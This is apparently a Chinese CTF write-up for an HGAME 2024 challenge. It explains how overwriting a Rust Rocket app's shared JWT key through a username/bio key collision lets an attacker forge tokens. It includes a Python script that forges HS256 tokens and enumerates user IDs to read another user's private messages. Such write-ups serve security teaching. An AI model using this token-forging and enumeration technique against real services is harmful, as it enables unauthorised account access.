# 火箭大头兵

## 题目简述

题目给出一个 Rust Rocket 留言板的源码，目标是读取用户 `Liki4` 的 private 消息。身份由 cookie 中的 JWT 决定，签名密钥随机生成后保存在全局 `CtxState` 的 `_system_jwt_key` 字段。漏洞在于用户可控的 profile `bio` 会被写回同一全局 JSON Map，攻击者可以通过拼接后的键名碰撞覆盖 JWT 密钥，继而伪造 `Liki4` 的 token。

## 解题过程

### 定位全局 JWT 密钥

应用启动时创建模板上下文，并生成 32 字符随机密钥：

```rust
fn init_ctx() -> Map<String, Value> {
    let mut context = Map::new();
    context.insert(
        String::from("_locale"),
        Value::String(String::from("zh_CN")),
    );
    context.insert(
        String::from("_title"),
        Value::String(String::from("留言板")),
    );
    context.insert(
        String::from("_system_jwt_key"),
        Value::String(randstr(32)),
    );
    context
}
```

该 Map 被 `Mutex` 包装并作为 Rocket managed state 保存，因此不是每个请求独立的模板变量，而是所有请求共享、可变的应用状态：

```rust
.manage(CtxState {
    ctx: Mutex::new(init_ctx()),
})
```

认证 request guard 从同一 Map 取出 `_system_jwt_key` 并验证名为 `token` 的 cookie。直接泄露密钥的思路不可行，因为 Tera profile 模板会跳过以下划线开头的系统保留键；但覆盖共享 Map 仍然可行。

### 利用 profile 键名拼接覆盖密钥

访问 profile 时，服务端把用户 `bio` JSON 中的每个键值写入全局上下文：

```rust
let bio: HashMap<String, Value> = serde_json::from_str(
    &result[0].bio.as_str()
).unwrap();

let mut ctx = ctx_state.ctx.lock().unwrap();
for (key, value) in bio {
    ctx.insert(
        format!("{}_{}", &user_from_jwt.username, key),
        value,
    );
}
```

`serde_json::Map::insert` 在键已存在时会更新原值。因此，只要让：

$$
\texttt{username}+\texttt{"_"}+\texttt{bio\_key}
=\texttt{"_system_jwt_key"},
$$

即可把随机密钥改成已知值。一个清晰、已被实战验证的组合是：

```text
username = _system_jwt
bio key  = key
bio value = a
```

写入 profile 后，拼接结果正是 `_system_jwt_key`，其 JSON Value 被改为字符串 `a`。

官方 PDF 还描述了另一条路径：注册只包含空格的用户名，利用 MySQL 字符串比较/存储行为再以空用户名登录。若 JWT 中最终用户名确实为空，则 bio key 必须写成 `system_jwt_key`，因为格式串本身已经额外插入一个下划线；把 key 也写成 `_system_jwt_key` 会形成两个前导下划线，不能覆盖目标。实际利用应直接解码自己的 JWT，确认 `username` 字段后再计算拼接键名。

### 使用正确的 secret 伪造 JWT

认证代码不是直接把 JSON 字符串值交给 JWT 库，而是调用：

```rust
let jwt = Jwt::new(
    &ctx.get("_system_jwt_key")
        .ok_or_else(/* ... */)?
        .to_string(),
);
```

`serde_json::Value::String("a").to_string()` 产生 JSON 表示 `"a"`，双引号也是结果的一部分。因此真正用于 HMAC 的 secret 字节为：

```text
"a"
```

也就是字母 `a` 两侧各带一个 ASCII 双引号。若在 jwt.io 中只填 `a`，签名不会通过；这不是 `jsonwebtoken` 库的错误。

JWT claim 至少包含：

```json
{
  "id": 1,
  "username": "Liki4",
  "exp": 1700000000
}
```

其中 `username` 已知，但 `id` 也必须与数据库记录对应。先注册一个新用户，解码自己 token 中的较大 `id` 作为搜索上界；随后让 `id` 从 1 遍历到该上界，为每个候选生成 `username = "Liki4"` 且未过期的 JWT，并带着 cookie 请求 private-message 路由。官方题解建议观察哪一个候选从错误响应变为 HTTP 200。

下面用 PyJWT 表达核心枚举逻辑；路径和成功判据需按实际路由响应调整：

```python
import time

import jwt
import requests

base_url = "http://<challenge-host>"
upper_id = 3000
secret = '"a"'

for user_id in range(1, upper_id + 1):
    claims = {
        "id": user_id,
        "username": "Liki4",
        "exp": int(time.time()) + 3600,
    }
    token = jwt.encode(claims, secret, algorithm="HS256")
    response = requests.get(
        base_url + "/message",
        cookies={"token": token},
        timeout=5,
    )

    if response.status_code == 200 and "hgame{" in response.text:
        print(user_id, response.text)
        break
```

成功命中正确 `user_id` 后，可看到 Liki4 的私密留言：

```text
hgame{63c4d9fc4613c81bce3a2e05577e8fc024c93ed1}
```

官方 PDF 未展示最终 flag；[参赛者复盘](https://csmantle.top/2024/02/29/ctf-writeup-hgame2024-week4.html)给出了 `_system_jwt`/`key` 的实际覆盖组合、ID 枚举流程和上述结果，正文已吸收这些必要信息。

## 方法总结

- 审计 Web 框架状态时，要区分请求局部变量与全局 managed state；后者一旦被用户输入污染，会影响所有后续认证。
- 用户字段经过 `format!("{}_{}", username, key)` 拼接后再写入 Map，属于可控键名污染。应直接列方程求出能碰撞系统键的字段组合。
- `insert` 对已存在键执行覆盖，而模板隐藏以下划线开头的键只阻止显示，不阻止写入。
- `serde_json::Value::to_string()` 返回 JSON 序列化文本，字符串值会包含双引号；JWT secret 必须与服务端最终字节完全一致。
- 伪造用户名仍不足以访问对象：claim 中的 `id` 也参与数据库查询，因此需用新注册账户确定合理上界，再枚举正确用户 ID。
